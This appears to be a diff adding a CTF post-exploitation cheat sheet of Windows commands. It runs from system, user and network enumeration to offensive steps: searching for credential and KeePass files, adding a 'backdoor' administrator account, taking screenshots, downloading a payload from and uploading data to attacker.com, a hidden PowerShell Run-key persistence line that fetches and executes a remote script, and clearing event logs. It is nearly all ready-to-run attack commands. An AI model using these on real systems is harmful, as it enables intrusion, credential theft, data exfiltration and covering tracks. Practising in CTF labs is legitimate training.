@@ -1,0 +1,69 @@
+========================================
+🎯 CTF Post-Exploitation Cheat Sheet
+Target: Windows 10
+========================================
+
+📌 SYSTEM ENUMERATION
+whoami
+hostname
+systeminfo
+$env:COMPUTERNAME
+$PSVersionTable
+Get-WmiObject Win32_OperatingSystem
+Get-WmiObject Win32_ComputerSystem
+
+📌 USER & PRIVILEGES
+net users
+net localgroup administrators
+whoami /groups
+whoami /priv
+Get-LocalUser | Format-List
+Get-ChildItem C:\Users
+
+📌 NETWORK
+ipconfig /all
+Get-NetIPConfiguration
+netstat -ano
+Get-DnsClientServerAddress
+route print
+
+📌 PROCESSES & SERVICES
+Get-Process | Sort CPU -Descending
+tasklist /v
+Get-Service | Where {$_.Status -eq "Running"}
+
+📌 INSTALLED PROGRAMS
+Get-WmiObject Win32_Product | Select Name, Version
+Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
+
+📌 SCHEDULED TASKS
+schtasks /query /fo LIST /v
+
+📌 CREDENTIALS / SENSITIVE FILES
+Get-ChildItem -Recurse -Include *pass*,*cred*,*.kdbx -Path C:\Users -ErrorAction SilentlyContinue
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s
+reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s
+
+📌 PRIVILEGE ESCALATION / POST
+net user backdoor Passw0rd123! /add
+net localgroup administrators backdoor /add
+
+📌 SCREENSHOT (Requires GUI)
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+$g = [System.Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen(0,0,0,0,$bmp.Size)
+$bmp.Save("C:\Users\Public\screenshot.jpg")
+
+📌 FILE DOWNLOAD / EXFIL
+Invoke-WebRequest http://attacker.com/payload.exe -OutFile C:\Users\Public\payload.exe
+Invoke-WebRequest http://attacker.com/upload -Method POST -InFile "C:\Users\Public\screenshot.jpg"
+
+📌 PERSISTENCE
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "powershell -w hidden -noni -nop -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/back.ps1')" /f
+
+📌 CLEANUP
+wevtutil cl System
+wevtutil cl Application
+del C:\Users\Public\screenshot.jpg
